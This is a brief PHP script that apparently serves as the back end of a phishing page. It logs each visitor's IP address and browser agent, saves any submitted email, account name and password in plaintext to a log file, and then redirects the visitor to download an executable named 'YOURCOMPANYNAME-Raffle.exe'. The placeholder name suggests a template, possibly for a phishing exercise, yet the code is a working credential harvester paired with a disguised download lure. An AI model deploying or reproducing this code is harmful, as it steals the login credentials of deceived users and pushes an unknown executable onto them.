<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
  $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
  $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
  $ipaddress = $_SERVER['REMOTE_ADDR'];
}

$browser = $_SERVER['HTTP_USER_AGENT'];

if(isset($_POST['email']) && isset($_POST['user']) && isset($_POST['pass']))
{
	file_put_contents("logs/downloadedFile.txt", "Date: " . date("Y/m/d") . "(" . date("h:i:sa") . ") | Email: " . $_POST['email'] . " | Account: " . $_POST['user'] . " | Pass: " . $_POST['pass'] . " | IP: " . $ipaddress . " | Agent: " . $browser . "\n", FILE_APPEND);
}
else
{
	file_put_contents("logs/downloadedFile.txt", "Date: " . date("Y/m/d") . "(" . date("h:i:sa") . ") | NO EMAIL | NO ACCOUNT | NO PASSWORD (DIRECT ENTRY) | IP: " . $ipaddress . " | Agent: " . $browser . "\n", FILE_APPEND);
}

header("Location: YOURCOMPANYNAME-Raffle.exe");

exit();

?>